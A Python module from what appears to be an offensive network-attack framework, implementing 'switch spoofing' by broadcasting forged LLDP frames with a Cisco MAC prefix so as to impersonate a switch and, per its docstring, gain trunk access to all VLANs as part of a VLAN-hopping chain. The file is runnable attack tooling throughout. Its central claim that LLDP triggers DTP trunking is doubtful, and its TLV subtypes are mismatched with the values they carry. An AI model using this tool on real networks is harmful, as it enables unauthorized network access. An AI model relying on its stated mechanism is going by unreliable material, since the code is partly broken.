"""
Switch Spoofing (DTP/LLDP) — T1557

Continuously broadcasts LLDP frames with a Cisco OUI source MAC, impersonating
a Cisco switch. On misconfigured or older switches, this triggers DTP (Dynamic
Trunking Protocol) negotiation, converting the port to trunk mode and granting
access to all VLANs.

Chain with dvlan or vlan for a complete VLAN hopping attack.
"""
import random
import struct
import threading
import time

from scapy.all import Ether, sendp

NAME = "swspoof"
DESCRIPTION = "Switch spoofing via continuous LLDP — triggers DTP trunk negotiation"
ATTCK_ID = "T1557"

_spoofing = False


# ── Framework interface ────────────────────────────────────────────────────────

def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(
        NAME,
        help=f"{DESCRIPTION} ({ATTCK_ID})",
        description=__doc__,
    )
    _add_args(p)
    add_engagement_args(p)
    p.set_defaults(func=run)


def run(args, logger):
    logger.info(
        "START | technique=%s | iface=%s | chassis=%s | interval=%ds | duration=%ds",
        ATTCK_ID, args.interface, args.chassis_id, args.interval, args.duration,
    )
    ok = _execute(args, logger)
    logger.info("END | success=%s", ok)
    return 0 if ok else 1


# ── Argument definition ────────────────────────────────────────────────────────

def _add_args(p):
    p.add_argument("--interface", "-i", required=True)
    p.add_argument("--chassis-id",   default="Cisco-Switch-01")
    p.add_argument("--port-id",      default="GigabitEthernet1/0/1")
    p.add_argument("--system-name",  default="Cisco-Catalyst-2960")
    p.add_argument("--interval", type=int, default=5,
                   help="Seconds between LLDP frames (default 5 — matches hello interval)")
    p.add_argument("--duration", "-d", type=int, default=60,
                   help="Run duration in seconds (default 60)")


# ── Core logic ────────────────────────────────────────────────────────────────

def _execute(args, logger=None):
    global _spoofing
    _log = logger.info if logger else print
    _spoofing = True

    t = threading.Thread(
        target=_spoof_loop,
        args=(args.interface, args.chassis_id, args.port_id,
              args.system_name, args.interval, _log),
        daemon=True,
    )
    t.start()
    _log(f"[SWSPOOF] Broadcasting as '{args.chassis_id}' every {args.interval}s "
         f"for {args.duration}s")
    time.sleep(args.duration)
    _spoofing = False
    _log("[SWSPOOF] Done")
    return True


def _spoof_loop(iface, chassis_id, port_id, system_name, interval, _log):
    count = 0
    while _spoofing:
        pkt = _build_lldp(chassis_id, port_id, system_name)
        sendp(pkt, iface=iface, verbose=False)
        count += 1
        _log(f"[SWSPOOF] Sent LLDP #{count} ({chassis_id})")
        time.sleep(interval)


def _build_lldp(chassis_id, port_id, system_name):
    oui = "00:00:0c"
    nic = ":".join(f"{random.randint(0,255):02x}" for _ in range(3))
    src_mac = f"{oui}:{nic}"

    def tlv(t, value: bytes) -> bytes:
        return struct.pack(">H", (t << 9) | len(value)) + value

    payload = b""
    payload += tlv(1, b"\x04" + chassis_id.encode())
    payload += tlv(2, b"\x03" + port_id.encode())
    payload += tlv(3, struct.pack(">H", 120))
    payload += tlv(5, system_name.encode())
    payload += b"\x00\x00"

    return Ether(dst="01:80:c2:00:00:0e", src=src_mac, type=0x88CC) / payload
